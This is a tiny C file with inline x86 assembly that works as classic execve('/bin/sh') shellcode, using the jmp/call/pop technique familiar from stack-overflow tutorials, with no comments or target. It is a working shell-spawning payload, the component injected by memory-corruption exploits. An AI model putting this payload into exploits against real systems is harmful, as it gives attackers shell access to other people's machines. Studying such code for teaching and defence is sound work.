void main() {
__asm__("jmp    line\n\taddress:popl   %esi\n\tmovl   %esi,0x8(%esi)\n\txorl   %eax,%eax\n\tmovb   %al,0x7(%esi)\n\tmovl   %eax,0xc(%esi)\n\tmovb   $0xb,%al\n\tmovl   %esi,%ebx\n\tleal   0x8(%esi),%ecx\n\tleal   0xc(%esi),%edx\n\tint    $0x80\n\txorl   %ebx, %ebx\n\tmovl   %ebx, %eax\n\tinc    %eax\n\tint    $0x80\n\tline:call   address\n\t.string \"/bin/sh\"\n\t");
}